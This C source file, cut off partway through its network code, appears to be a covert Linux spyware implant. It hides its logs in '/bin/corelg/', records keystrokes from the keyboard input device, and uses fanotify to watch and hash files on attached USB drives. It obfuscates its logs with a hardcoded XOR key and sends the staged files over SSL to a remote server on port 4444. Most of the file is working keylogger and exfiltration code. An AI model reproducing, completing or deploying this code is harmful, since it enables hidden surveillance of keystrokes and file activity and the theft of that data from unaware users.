// Otherwise we don't get O_LARGEFILE
#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <poll.h>
#include <errno.h>
#include <fcntl.h>
#include <time.h>
#include <pcap.h>
#include <libudev.h>
#include <dirent.h>
#include <signal.h>

#include <linux/input.h>
#include <sys/socket.h>
#include <sys/fanotify.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>

#include <X11/Xlib.h>
#include <X11/Xutil.h>

#include <openssl/sha.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#define LOG_FOLDER "/bin/corelg/"
#define TO_SEND_FOLDER "to_send/"
#define USER_DIRECTORY "/home/astra"

#define MAIN_LOG_FILE "corelg"
#define KEYBOARD_LOG_FILE "corelg_1"
#define DEVICES_PATH "/proc/bus/input/devices"

#define MAX_DEVICES_BUFFER_SIZE 4096
#define FANOTIFY_BUFFER_SIZE 8192

#define ENCRYPTION_KEY "my_secret_key"

// Sending files
#define SERVER_PORT 4444
#define BUFFER_SIZE 4096
#define RECEIVE_ACK "ACK"
#define CUSTOM_PAYLOAD "macip"
#define MAX_PAYLOAD_SIZE 100
#define ACK_TIMEOUT 10  // Seconds
#define SLEEP_TIME_CONNECT 5 // Seconds
#define MAX_RETRIES_CONNECT 3


const char* keycode_to_char(int keycode) {
    switch(keycode) {
        case KEY_ESC: return "ESC";
        case KEY_F1: return "F1";
        case KEY_F2: return "F2";
        case KEY_F3: return "F3";
        case KEY_F4: return "F4";
        case KEY_F5: return "F5";
        case KEY_F6: return "F6";
        case KEY_F7: return "F7";
        case KEY_F8: return "F8";
        case KEY_F9: return "F9";
        case KEY_F10: return "F10";
        case KEY_F11: return "F11";
        case KEY_F12: return "F12";
        case KEY_SYSRQ: return "PRINT SCREEN";
        case KEY_SCROLLLOCK: return "SCROLL LOCK";
        case KEY_PAUSE: return "PAUSE";

        case KEY_GRAVE: return "`";
        case KEY_1: return "1";
        case KEY_2: return "2";
        case KEY_3: return "3";
        case KEY_4: return "4";
        case KEY_5: return "5";
        case KEY_6: return "6";
        case KEY_7: return "7";
        case KEY_8: return "8";
        case KEY_9: return "9";
        case KEY_0: return "0";
        case KEY_MINUS: return "-";
        case KEY_EQUAL: return "=";
        case KEY_BACKSPACE: return "BACKSPACE";
        case KEY_INSERT: return "INSERT";
        case KEY_HOME: return "HOME";
        case KEY_PAGEUP: return "PAGE UP";

        case KEY_TAB: return "TAB";
        case KEY_Q: return "Q";
        case KEY_W: return "W";
        case KEY_E: return "E";
        case KEY_R: return "R";
        case KEY_T: return "T";
        case KEY_Y: return "Y";
        case KEY_U: return "U";
        case KEY_I: return "I";
        case KEY_O: return "O";
        case KEY_P: return "P";
        case KEY_LEFTBRACE: return "[";
        case KEY_RIGHTBRACE: return "]";
        case KEY_BACKSLASH: return "\\";
        case KEY_DELETE: return "DELETE";
        case KEY_END: return "END";
        case KEY_PAGEDOWN: return "PAGE DOWN";

        case KEY_CAPSLOCK: return "CAPSLOCK";
        case KEY_A: return "A";
        case KEY_S: return "S";
        case KEY_D: return "D";
        case KEY_F: return "F";
        case KEY_G: return "G";
        case KEY_H: return "H";
        case KEY_J: return "J";
        case KEY_K: return "K";
        case KEY_L: return "L";
        case KEY_SEMICOLON: return ";";
        case KEY_APOSTROPHE: return "'";
        case KEY_ENTER: return "ENTER";

        case KEY_LEFTSHIFT: return "LEFT SHIFT";
        case KEY_Z: return "Z";
        case KEY_X: return "X";
        case KEY_C: return "C";
        case KEY_V: return "V";
        case KEY_B: return "B";
        case KEY_N: return "N";
        case KEY_M: return "M";
        case KEY_COMMA: return ",";
        case KEY_DOT: return ".";
        case KEY_SLASH: return "/";
        case KEY_RIGHTSHIFT: return "RIGHT SHIFT";

        case KEY_LEFTCTRL: return "LEFT CTRL";
        case KEY_LEFTMETA: return "LEFT SUPER KEY (WINDOWS)";
        case KEY_LEFTALT: return "LEFT ALT";
        case KEY_SPACE: return "SPACE";
        case KEY_RIGHTALT: return "RIGHT ALT";
        case KEY_RIGHTMETA: return "RIGHT SUPER KEY (WINDOWS)"; // 26 characters, maximum
        case KEY_FN_D: return "FUNCTION";
        case KEY_RIGHTCTRL: return "RIGHT CTRL";

        case KEY_UP: return "UP ARROW";
        case KEY_LEFT: return "LEFT ARROW";
        case KEY_DOWN: return "DOWN ARROW";
        case KEY_RIGHT: return "RIGHT ARROW";

        case KEY_NUMLOCK: return "NUMLOCK";
        case KEY_KPSLASH: return "/ (NUMPAD)";
        case KEY_KPASTERISK: return "*";
        case KEY_KPMINUS: return "- (NUMPAD)";
        case KEY_KP1: return "1 (NUMPAD)";
        case KEY_KP2: return "2 (NUMPAD)";
        case KEY_KP3: return "3 (NUMPAD)";
        case KEY_KP4: return "4 (NUMPAD)";
        case KEY_KP5: return "5 (NUMPAD)";
        case KEY_KP6: return "6 (NUMPAD)";
        case KEY_KP7: return "7 (NUMPAD)";
        case KEY_KP8: return "8 (NUMPAD)";
        case KEY_KP9: return "9 (NUMPAD)";
        case KEY_KP0: return "0 (NUMPAD)";
        case KEY_KPPLUS: return "+ (NUMPAD)";
        case KEY_KPENTER: return "ENTER (NUMPAD)";
        case KEY_KPDOT: return ". (NUMPAD)";

        default: return "";
    }
}

int create_folder_if_not_exists(const char *folder_path) {
    struct stat st = {0};
    if (stat(folder_path, &st) == -1) {
        if (mkdir(folder_path, 0777) == -1 && errno != EEXIST) {
            return 0;
        }
        return 1;
    }
    return 1;
}

char *xor_encrypt(const char *input, size_t len) {
    const size_t key_len = strlen(ENCRYPTION_KEY);
    char *encrypted = (char *)malloc(len + 1); // Allocate one extra for null-terminator

    if (!encrypted) {
        return NULL;
    }

    for (size_t i = 0; i < len; ++i) {
        encrypted[i] = input[i] ^ ENCRYPTION_KEY[i % key_len];
    }
    encrypted[len] = '\0'; // Null-terminate the encrypted string

    return encrypted;
}

// Do not give it messages with \n
void log_message(const char *message) {
    create_folder_if_not_exists(LOG_FOLDER);

    char full_path[2 * PATH_MAX];
    int written = snprintf(full_path, sizeof(full_path), "%s%s", LOG_FOLDER, MAIN_LOG_FILE);
    if (written >= sizeof(full_path) || written < 0) {
        return;
    }

    FILE *file = fopen(full_path, "ab");
    if (file == NULL) {
        return;
    }

    struct timespec ts;
    if (clock_gettime(CLOCK_REALTIME, &ts) == -1) {
        fclose(file);
        return;
    }

    struct tm *time_info;
    char time_buffer[40];

    time_info = localtime(&ts.tv_sec);
    if (!time_info) {
        fclose(file);
        return;
    }

    size_t bytes_written = strftime(time_buffer, sizeof(time_buffer), "%Y-%m-%d %H:%M:%S", time_info);
    if (bytes_written == 0) {
        fclose(file);
        return;
    }
    long milliseconds = ts.tv_nsec / 1000000; // Convert nanoseconds to milliseconds

    char log_entry[PATH_MAX * 3];
    int log_size = snprintf(log_entry, sizeof(log_entry), "[%s.%03ld]: %s\n", time_buffer, milliseconds, message);
    if (log_size < 0 || (size_t)log_size >= sizeof(log_entry)) {
        fclose(file);
        return;
    }
    //printf("%s", log_entry); // DEBUG
    char *encrypted_message = xor_encrypt(log_entry, log_size);
    if (encrypted_message) {
        fwrite(encrypted_message, 1, log_size, file);
        free(encrypted_message);
    }

    fclose(file);
}

void log_keyboard(const char *str) {
    char full_path[2 * PATH_MAX];
    int written = snprintf(full_path, sizeof(full_path), "%s%s", LOG_FOLDER, KEYBOARD_LOG_FILE);
    if (written >= sizeof(full_path) || written < 0) {
        log_message("Error: Failed to construct keyboard log path");
        return;
    }

    FILE *file = fopen(full_path, "ab");
    if (file == NULL) {
        log_message("Error: Failed to open keyboard log file");
        return;
    }

    size_t str_len = strlen(str);
    char *to_encrypt = malloc(str_len + 2); // +1 for \n, +1 for null terminator
    if (to_encrypt == NULL) {
        log_message("Error: Memory allocation failed for encryption buffer");
        fclose(file);
        return;
    }
    snprintf(to_encrypt, str_len + 2, "%s\n", str);

    char *encrypted = xor_encrypt(to_encrypt, str_len + 1); // +1 for \n
    free(to_encrypt);
    if (!encrypted) {
        log_message("Error: Failed to encrypt keyboard input");
        fclose(file);
        return;
    }

    size_t bytes_written = fwrite(encrypted, 1, str_len + 1, file); // +1 for \n
    if (bytes_written != str_len + 1) {
        log_message("Error: Failed to write encrypted keyboard input to log file");
    }

    free(encrypted);

    if (fclose(file) != 0) {
        log_message("Error: Failed to close keyboard log file");
    }
}

int find_mount_point(const char *devnode, char **mount_point) {
    FILE *file = fopen("/proc/mounts", "r");
    if (file == NULL) {
        log_message("An error occurred while opening /proc/mounts");
        return 1;
    }

    char *line = NULL;
    size_t line_size = 0;
    while ((getline(&line, &line_size, file)) != -1) {
        char dev[PATH_MAX] = {0};
        char mount[PATH_MAX] = {0};

        if (sscanf(line, " %s %s", dev, mount) == 2) {
            if (strcmp(dev, devnode) == 0) {
                *mount_point = strdup(mount);
                if (*mount_point == NULL) {
                    perror("Error allocating memory for mount point");
                    free(line);
                    if (fclose(file) != 0) {
                        log_message("An error occurred while closing /proc/mounts");
                    }
                    return 1;
                }
                free(line);
                fclose(file);
                return 0;
            }
        }
    }

    free(line);
    if (fclose(file) != 0) {
        log_message("An error occurred while closing /proc/mounts");
    }
    return 1;
}

char* compute_sha256_of_file(const char* filename) {
    FILE* file = fopen(filename, "rb");
    if (file == NULL) {
        log_message("Error: Failed to open file for hashing");
        return NULL;
    }

    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256_CTX sha256;
    unsigned char buffer[4096];
    size_t bytesRead = 0;

    SHA256_Init(&sha256);

    while ((bytesRead = fread(buffer, 1, sizeof(buffer), file))) {
        SHA256_Update(&sha256, buffer, bytesRead);
    }

    SHA256_Final(hash, &sha256);

    char* output = malloc(SHA256_DIGEST_LENGTH * 2 + 1);
    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        sprintf(output + (i * 2), "%02x", hash[i]);
    }

    if (fclose(file) != 0) {
        log_message("Error: Failed t0 close file after hashing");
    }
    return output;
}

int compute_sha256_of_string(const char* data, char outputBuffer[65]) {
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256_CTX sha256;
    if (!SHA256_Init(&sha256)) {
        log_message("Error: SHA256_Init failed");
        return 1;
    }

    if (!SHA256_Update(&sha256, data, strlen(data))) {
        log_message("Error: SHA256_Update failed");
        return 1;
    }

    if (!SHA256_Final(hash, &sha256)) {
        log_message("Error: SHA256_Final failed");
        return 1;
    }

    int written = -1;
    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        written = snprintf(outputBuffer + (i * 2), 3, "%02x", hash[i]);
        if (written != 2) {
            return 1;
        }
    }
    outputBuffer[64] = 0;
    return 0;
}

enum {
    FD_POLL_FANOTIFY,
    FD_POLL_MAX
};

static uint64_t event_mask =
        (FAN_ACCESS |         /* File accessed */
         FAN_MODIFY |         /* File modified */
         FAN_CLOSE_WRITE |    /* Writable file closed */
         FAN_CLOSE_NOWRITE |  /* Unwritable file closed */
         FAN_OPEN |           /* File was opened */
         FAN_ONDIR |          /* We want to be reported of events in the directory */
         FAN_EVENT_ON_CHILD); /* We want to be reported of events in files of the directory */

static char *get_program_name_from_pid (int pid, char *buffer, size_t buffer_size) {
    int fd;
    ssize_t len;
    char *aux;

    int written = snprintf(buffer, buffer_size, "/proc/%d/cmdline", pid);
    if (written >= buffer_size || written < 0) {
        log_message("Error: Failed to format proc path");
        return NULL;
    }

    if ((fd = open(buffer, O_RDONLY)) < 0) {
        log_message("Error: Failed to open proc path");
        return NULL;
    }

    len = read(fd, buffer, buffer_size - 1);
    close(fd);

    if (len <= 0) {
        log_message("Error: Failed to read proc path");
        return NULL;
    }

    buffer[len] = '\0';
    aux = strchr(buffer, '\0');
    if (aux && aux != buffer)
        *aux = '\0';

    return buffer;
}

static char *get_file_path_from_fd(int fd, char *buffer, size_t buffer_size) {
    if (fd < 0) {
        log_message("Error: Got negative file descriptor");
        return NULL;
    }

    int written = snprintf(buffer, buffer_size, "/proc/self/fd/%d", fd);
    if (written < 0 || written >= buffer_size) {
        log_message("Error: Failed to write to buffer with /proc/self/fd/");
        return NULL;
    }

    char temp_buffer[buffer_size];
    ssize_t len;
    len = readlink(buffer, temp_buffer, buffer_size - 1);
    if (len < 0) {
        log_message("Error: Failed to get filepath from fd");
        return NULL;
    }

    temp_buffer[len] = '\0';

    // Since the size of temp_buffer is the same as buffer, and we've ensured len is less than buffer_size - 1, strncpy is safe to use here.
    strncpy(buffer, temp_buffer, buffer_size - 1);
    buffer[buffer_size - 1] = '\0'; // Ensure null-termination
    return buffer;
}

void copy_file(const char* src, const char* dest) {
    FILE* source = fopen(src, "rb");
    if (source == NULL) {
        return;
    }

    FILE* destination = fopen(dest, "wb");
    if (destination == NULL) {
        log_message("Error: Failed to open destination file for copy");
        if (fclose(source) != 0) {
            log_message("Error: Failed to close source file");
        }
        return;
    }

    char buffer[4096];
    size_t bytesRead;
    int copySuccessful = 1;

    while ((bytesRead = fread(buffer, 1, sizeof(buffer), source)) > 0) {
        if (fwrite(buffer, 1, bytesRead, destination) != bytesRead) {
            log_message("Error: Failed to write to destination file");
            copySuccessful = 0;
            break;
        }
    }

    if (fclose(source) != 0) {
        log_message("Error: Failed to close source file");
        copySuccessful = 0;
    }
    if (fclose(destination) != 0) {
        log_message("Error: Failed to close destination file");
        copySuccessful = 0;
    }
    if (copySuccessful) {
        if (remove(src) != 0) {
            log_message("Error: Failed to delete source file after copying");
        }
    }
}

static void process_fanotify_event (struct fanotify_event_metadata *event, const pid_t program_pid) {
    if ((pid_t)event->pid == program_pid) {
        return;
    }

    char string_buffer[PATH_MAX * 2];
    int offset = 0;

    char path[PATH_MAX];
    if (!get_file_path_from_fd(event->fd, path, PATH_MAX)) {
        return;
    }

    int new_offset = snprintf(string_buffer, sizeof(string_buffer), "Received event in path '%s'", path);
    if (new_offset >= sizeof(string_buffer) || new_offset < 0) {
        log_message("Error: Failed to create log message for event");
        return;
    }
    offset += new_offset;

    new_offset = snprintf(string_buffer + offset, sizeof(string_buffer) - offset, " (%s)", get_program_name_from_pid (event->pid,path,PATH_MAX) ? path : "unknown");
    if (new_offset >= sizeof(string_buffer) || new_offset < 0) {
        log_message("Error: Failed to create log message for event");
        return;
    }
    offset += new_offset;

    if (event->mask & FAN_OPEN) {
        new_offset = snprintf(string_buffer + offset, sizeof(string_buffer) - offset, " FAN_OPEN");
        if (new_offset >= sizeof(string_buffer) || new_offset < 0) {
            log_message("Error: Failed to create log message for event");
            return;
        }
        offset += new_offset;
    }
    if (event->mask & FAN_ACCESS) {
        new_offset = snprintf(string_buffer + offset, sizeof(string_buffer) - offset, " FAN_ACCESS");
        if (new_offset >= sizeof(string_buffer) || new_offset < 0) {
            log_message("Error: Failed to create log message for event");
            return;
        }
        offset += new_offset;
    }
    if (event->mask & FAN_MODIFY) {
        new_offset = snprintf(string_buffer + offset, sizeof(string_buffer) - offset, " FAN_MODIFY");
        if (new_offset >= sizeof(string_buffer) || new_offset < 0) {
            log_message("Error: Failed to create log message for event");
            return;
        }
        offset += new_offset;
    }
    if (event->mask & FAN_CLOSE_WRITE) {
        new_offset = snprintf(string_buffer + offset, sizeof(string_buffer) - offset, " FAN_CLOSE_WRITE");
        if (new_offset >= sizeof(string_buffer) || new_offset < 0) {
            log_message("Error: Failed to create log message for event");
            return;
        }
        offset += new_offset;
    }
    if (event->mask & FAN_CLOSE_NOWRITE) {
        new_offset = snprintf(string_buffer + offset, sizeof(string_buffer) - offset, " FAN_CLOSE_NOWRITE");
        if (new_offset >= sizeof(string_buffer) || new_offset < 0) {
            log_message("Error: Failed to create log message for event");
            return;
        }
        offset += new_offset;
    }

    struct stat st;
    if (fstat(event->fd, &st) == -1) {
        log_message("Error: fstat failed");
    }
    else {
        if (S_ISREG(st.st_mode)) {
            char *sha256hash = compute_sha256_of_file(path);
            if (sha256hash) {
                if (strcmp(sha256hash, "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855") == 0) {
                    new_offset = snprintf(string_buffer + offset, sizeof(string_buffer) - offset, " (empty file)");
                    if (new_offset >= sizeof(string_buffer) || new_offset < 0) {
                        log_message("Error: Failed to create log message with empty hash");
                        return;
                    }
                }
                else {
                    new_offset = snprintf(string_buffer + offset, sizeof(string_buffer) - offset, " %s", sha256hash);
                    if (new_offset >= sizeof(string_buffer) || new_offset < 0) {
                        log_message("Error: Failed to create log message with hash");
                        return;
                    }
                }
                free(sha256hash);
            }
            else {
                new_offset = snprintf(string_buffer + offset, sizeof(string_buffer) - offset, " hash-error");
                if (new_offset >= sizeof(string_buffer) || new_offset < 0) {
                    log_message("Error: Failed to log hash-error");
                    return;
                }
            }
        }
    }
    log_message(string_buffer);
    close(event->fd);
}

static int initialize_fanotify (){
    int fanotify_fd;

    if ((fanotify_fd = fanotify_init(FAN_CLOEXEC, O_RDONLY | O_CLOEXEC | O_LARGEFILE)) < 0) {
        log_message("Error: Failed to init fanotify");
        return -1;
    }
    return fanotify_fd;
}

static void mark_mount_to_monitor(const int fanotify_fd, const char *path) {
    int written = 0;
    if (fanotify_mark(fanotify_fd, FAN_MARK_ADD | FAN_MARK_MOUNT, event_mask, AT_FDCWD, path) == -1) {
        char string_buffer[PATH_MAX + 50];
        written = snprintf(string_buffer, sizeof(string_buffer), "Error: Failed to start monitoring directory '%s'", path);
        if (written >= sizeof(string_buffer) || written < 0) {
            log_message("Error: Failed to log fanotify start monitor error");
        }
        else {
            log_message(string_buffer);
        }
    }
    else {
        char string_buffer[256];
        written = snprintf(string_buffer, sizeof(string_buffer), "Started monitoring directory '%s'", path);
        if (written >= sizeof(string_buffer) || written < 0) {
            log_message("Error: Failed to log fanotify start monitor");
        }
        else {
            log_message(string_buffer);
        }
    }
}

void mark_directory_and_subdirectories_to_monitor(int fanotify_fd, const char *path) {
    int written = 0;

    DIR *dir = opendir(path);
    if (dir == NULL) {
        log_message("Error: Failed to open directory");
        return;
    }

    char string_buffer[PATH_MAX + 50];
    if (fanotify_mark(fanotify_fd, FAN_MARK_ADD, event_mask, AT_FDCWD, path) == -1) {
        written = snprintf(string_buffer, sizeof(string_buffer), "Error: Failed to start monitoring directory '%s'", path);
        if (written >= sizeof(string_buffer) || written < 0) {
            log_message("Error: Failed to log failure of start of monitoring");
        }
        else {
            log_message(string_buffer);
        }
        // If directory fails, we still need to try to monitor it's subdirectories
        closedir(dir);
        return;
    }
    else {
        written = snprintf(string_buffer, sizeof(string_buffer), "Started monitoring directory '%s'", path);
        if (written >= sizeof(string_buffer) || written < 0) {
            log_message("Error: Failed to log start of monitoring");
        }
        else {
            log_message(string_buffer);
        }
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        // Skip . and ..
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        if (entry->d_type == DT_DIR) {
            char new_path[PATH_MAX];
            written = snprintf(new_path, sizeof(new_path), "%s/%s", path, entry->d_name);
            if (written >= sizeof(new_path) || written < 0) {
                log_message("Error: Failed to construct new path");
            }
            else {
                mark_directory_and_subdirectories_to_monitor(fanotify_fd, new_path);
            }
        }
    }

    if (closedir(dir) == -1) {
        log_message("Error: Failed to close directory");
    }
}

void monitor_existing_flashdrives(struct udev* udev, int fanotify_fd) {
    struct udev_enumerate* enumerate;
    struct udev_list_entry* devices;
    struct udev_list_entry* dev_list_entry;

    enumerate = udev_enumerate_new(udev);
    if (!enumerate) {
        log_message("Error: Failed to create udev enumerate object");
        return;
    }
    if (udev_enumerate_add_match_subsystem(enumerate, "block") < 0) {
        log_message("Error: Failed to add subsystem match for 'block' for udev enumerate");
        udev_enumerate_unref(enumerate);
        return;
    }
    if (udev_enumerate_add_match_property(enumerate, "ID_BUS", "usb") < 0) {
        log_message("Error: Failed to add property match for udev enumerate");
        udev_enumerate_unref(enumerate);
        return;
    }
    if (udev_enumerate_scan_devices(enumerate) < 0) {
        log_message("Error: Failed to scan udev devices");
        udev_enumerate_unref(enumerate);
        return;
    }

    devices = udev_enumerate_get_list_entry(enumerate);
    if (!devices) {
        log_message("No currently attached flashdrived detected");
        udev_enumerate_unref(enumerate);
        return;
    }

    udev_list_entry_foreach(dev_list_entry, devices) {
        const char* syspath = udev_list_entry_get_name(dev_list_entry);
        if (!syspath) {
            log_message("Error: Failed to retrieve syspath from list entry");
            continue;  // Skipping to the next iteration since we can't process this entry without a syspath
        }

        struct udev_device* dev = udev_device_new_from_syspath(udev, syspath);
        if (!dev) {
            log_message("Error: Failed to create udev device from syspath");
            continue;  // Skipping to the next iteration since we can't process this entry without the device
        }

        if (dev) {
            const char* devnode = udev_device_get_devnode(dev);
            if (devnode) {
                const char* filesystem_uuid = udev_device_get_property_value(dev, "ID_FS_UUID");
                if (!filesystem_uuid) {
                    udev_device_unref(dev);
                    continue;
                }

                const char* name = udev_device_get_property_value(dev, "ID_MODEL");
                const char* vendor = udev_device_get_property_value(dev, "ID_VENDOR");
                const char* serial = udev_device_get_property_value(dev, "ID_SERIAL_SHORT");

                log_message("Existing device detected.");
                char string_buffer[256];
                int written = 0;
                written = snprintf(string_buffer, sizeof(string_buffer), "Device name: %s", name ? name : "Unknown");
                if (written >= sizeof(string_buffer) || written < 0) {
                    log_message("Error: Failed to log device name");
                }
                else {
                    log_message(string_buffer);
                }

                written = snprintf(string_buffer, sizeof(string_buffer), "Device vendor: %s", vendor ? vendor : "Unknown");
                if (written >= sizeof(string_buffer) || written < 0) {
                    log_message("Error: Failed to log device vendor");
                }
                else {
                    log_message(string_buffer);
                }

                written = snprintf(string_buffer, sizeof(string_buffer), "Serial number: %s", serial ? serial : "Unknown");
                if (written >= sizeof(string_buffer) || written < 0) {
                    log_message("Error: Failed to log device serial number");
                }
                else {
                    log_message(string_buffer);
                }

                written = snprintf(string_buffer, sizeof(string_buffer), "Filesystem UUID: %s", filesystem_uuid);
                if (written >= sizeof(string_buffer) || written < 0) {
                    log_message("Error: Failed to log device filesystem UUID");
                }
                else {
                    log_message(string_buffer);
                }

                char *mount_point = NULL;
                if (find_mount_point(devnode, &mount_point) == 0) {
                    written = snprintf(string_buffer, sizeof(string_buffer), "Device mount point: %s", mount_point);
                    if (written >= sizeof(string_buffer) || written < 0) {
                        log_message("Error: Failed to log device mount point");
                    }
                    else {
                        log_message(string_buffer);
                    }
                    mark_mount_to_monitor(fanotify_fd, mount_point);
                    free(mount_point);
                }
                else {
                    log_message("Mount point not found");
                }
            }
            udev_device_unref(dev);
        }
    }
    udev_enumerate_unref(enumerate);
}

int get_keyboard_event_num() {
    FILE *file = fopen(DEVICES_PATH, "r");
    if (!file) {
        log_message("Error: Failed to open devices file");
        return -1;
    }

    char *line = NULL;
    size_t buffer_size = 0;
    int eventNum = -2;  // -2 = Not found, -1 = Error
    int isKeyboard = 0;
    int c;
    size_t len = 0;

    while ((c = fgetc(file)) != EOF) {
        if (len == buffer_size) {
            if (buffer_size + 128 > MAX_DEVICES_BUFFER_SIZE) {
                log_message("Error: Failed to read devices file");
                free(line);
                fclose(file);
                return -1;
            }

            buffer_size += 128;  // Increase the buffer size in chunks of 128 bytes
            char *new_line = realloc(line, buffer_size);
            if (!new_line) {
                log_message("Error: Failed to allocate memory");
                free(line);
                if (fclose(file) != 0) {
                    log_message("Error: Failed to close devices file");
                }
                return -1;
            }
            line = new_line;
        }
        line[len++] = (char)c;

        if (c == '\n') {
            line[len] = '\0';  // Null-terminate the line
            if (strstr(line, "EV=12001f") || strstr(line, "EV=120013")) {
                isKeyboard++;
            }
            if (strstr(line, "Handlers=")) {
                char *eventPtr = strstr(line, "event");
                if (eventPtr) {
                    char *endPtr;
                    long int longEventNum = strtol(eventPtr + 5, &endPtr, 10);  // "event" has 5 characters
                    if (eventPtr + 5 == endPtr || longEventNum < INT_MIN || longEventNum > INT_MAX) {
                        // No characters were consumed, conversion failed or the parsed value doesn't fit into an int
                        eventNum = -2;
                    }
                    else {
                        eventNum = (int)longEventNum;
                    }
                }
            }

            if (isKeyboard > 0 && eventNum != -2) {
                break;  // Exit loop if a keyboard with an event number is found
            }
            if (strlen(line) == 1) {
                isKeyboard = 0;
                eventNum = -2;
            }
            len = 0;  // Reset the length for the next line
        }
    }
    free(line);
    if (fclose(file) != 0) {
        log_message("Error: Failed to close devices file");
    }
    return eventNum;
}

int copy_files() {
    DIR* dir = opendir(LOG_FOLDER);
    if (dir == NULL) {
        log_message("Error: Failed to open source folder for copying");
        return 1;
    }

    char toSendPath[PATH_MAX];
    int written = snprintf(toSendPath, sizeof(toSendPath), "%s%s", LOG_FOLDER, TO_SEND_FOLDER);
    if (written < 0 || written >= sizeof(toSendPath)) {
        log_message("Error: Failed to construct to_send folder path");
        return 1;
    }
    if (!create_folder_if_not_exists(toSendPath)) {
        log_message("Error: create_folder_if_not_exists failed");
        return 1;
    }

    struct dirent* entry;
    char srcPath[PATH_MAX];
    char destPath[PATH_MAX];
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {  // if it's a regular file
            written = snprintf(srcPath, sizeof(srcPath), "%s%s", LOG_FOLDER, entry->d_name);
            if (written < 0 || written >= sizeof(srcPath)) {
                log_message("Error: Failed to construct source path for copying");
                return 1;
            }

            if (strcmp(entry->d_name, MAIN_LOG_FILE) == 0 || strcmp(entry->d_name, KEYBOARD_LOG_FILE) == 0) {
                // Compute SHA-256 hash of the current time with milliseconds
                char timeBuffer[100];
                struct timespec ts;
                if (clock_gettime(CLOCK_REALTIME, &ts) == -1) {
                    log_message("Error: Failed to get time for copying files");
                    return 1;
                }
                written = snprintf(timeBuffer, sizeof(timeBuffer), "%ld%ld", ts.tv_sec, ts.tv_nsec / 1000000); // milliseconds
                if (written < 0 || written >= sizeof(timeBuffer)) {
                    log_message("Error: Failed to construct time buffer during copying");
                    return 1;
                }
                char hashOutput[65];
                if (compute_sha256_of_string(timeBuffer, hashOutput)) {
                    return 1;
                }
                written = snprintf(destPath, sizeof(destPath), "%s%s%s", LOG_FOLDER, TO_SEND_FOLDER, hashOutput);
                if (written < 0 || written >= sizeof(destPath)) {
                    log_message("Error: Failed to construct destination path during copying");
                    return 1;
                }
            }
            else {
                written = snprintf(destPath, sizeof(destPath), "%s%s%s", LOG_FOLDER, TO_SEND_FOLDER, entry->d_name);
                if (written < 0 || written >= sizeof(destPath)) {
                    log_message("Error: Failed to construct destination path during copying");
                    return 1;
                }
            }
            // If copy of single file fails we need to send other. If every files fail - we won't send anything.
            copy_file(srcPath, destPath);
        }
    }
    if (closedir(dir) == -1) {
        log_message("Error: Failed to close source dir after copying");
        return 1;
    }
    return 0;
}

int send_file(SSL *ssl, const char *file_path) {
    // Extract filename from a potentially full path
    char *filename = strrchr(file_path, '/');
    if (!filename) {
        filename = (char *)file_path;
    }
    else {
        filename++;
    }

    size_t name_len = strlen(filename);
    int written;
    written = SSL_write(ssl, &name_len, sizeof(int));
    if (written <= 0) {
        log_message("Error: Failed to send name length");
        return 1;
    }

    written = SSL_write(ssl, filename, (int)name_len);
    if (written <= 0) {
        log_message("Error: Failed to send filename");
        return 1;
    }
    FILE *file = fopen(file_path, "rb");
    if (!file) {
        log_message("Error: Failed to open file for sending");
        return 1;
    }

    if (fseek(file, 0, SEEK_END) != 0) {
        if (fclose(file) != 0) {
            log_message("Error: Failed to close file after fseek");
        }
        log_message("Error: fseek to end of file failed");
        return 1;
    }
    long file_size = ftell(file);
    if (file_size == -1) {
        if (fclose(file) != 0) {
            log_message("Error: Failed to close file after ftell");
        }
        log_message("Error: Failed to calculate file size to send");
        return 1;
    }

    if (fseek(file, 0, SEEK_SET)) {
        if (fclose(file) != 0) {
            log_message("Error: Failed to close file during sending");
        }
        log_message("Error: fseek to start of file failed");
        return 1;
    }

    written = SSL_write(ssl, &file_size, sizeof(long));
    if (written <= 0) {
        if (fclose(file) != 0) {
            log_message("Error: Failed to close file during sending");
        }
        log_message("Error: Failed to send file size");
        return 1;
    }

    char buffer[BUFFER_SIZE];
    size_t bytes_read;
    long bytes_left = file_size;
    while (1) {
        bytes_read = fread(buffer, 1, BUFFER_SIZE, file);

        if (bytes_read > 0) {
            written = SSL_write(ssl, buffer, (int)bytes_read);
            if (written <= 0) {
                log_message("Error: Failed to send part of file");
                if (fclose(file) != 0) {
                    log_message("Error: Failed to close file during sending");
                }
                return 1;
            }
            bytes_left -= (int)bytes_read;
        }

        if (bytes_read < BUFFER_SIZE) {
            // If not error, then EOF - OK
            if (ferror(file)) {
                log_message("Error: Failed to read file");
                if (fclose(file) != 0) {
                    log_message("Error: Failed to close file during sending");
                }
                return 1;
            }
            // Reached EOF
            else {
                break;
            }
        }
    }
    if (fclose(file) != 0) {
        log_message("Error: Failed to close file during sending");
    }

    time_t start_time = time(NULL);
    time_t timeout = ACK_TIMEOUT;

    char ack[sizeof(RECEIVE_ACK)];
    int ack_len = 0;
    while (ack_len <= 0) {
        ack_len = SSL_read(ssl, ack, sizeof(ack));
        time_t current_time = time(NULL);
        if (current_time - start_time >= timeout) {
            log_message("Did not receive acknowledgement");
            break;
        }
    }

    if (ack_len != sizeof(RECEIVE_ACK) || strncmp(ack, RECEIVE_ACK, sizeof(RECEIVE_ACK)) != 0) {
        log_message("Error: Received incorrect acknowledgement");
    }
    else {
        if (remove(file_path) != 0) {
            log_message("Error: Failed to delete sent file");
        }
        return 0;
    }
}

int send_files_to_server(const struct ether_arp *arp_header) {
    const SSL_METHOD *method;
    SSL_CTX *ctx;

    method = SSLv23_client_method();
    if (method == NULL) {
        log_message("Error: Failed to get SSL method");
        return 1;
    }

    ctx = SSL_CTX_new(method);
    if (!ctx) {
        log_message("Error: Failed to create SSL context");
        return 1;
    }

    int server = socket(AF_INET, SOCK_STREAM, 0);
    if (server == -1) {
        log_message("Error: Failed to create socket");
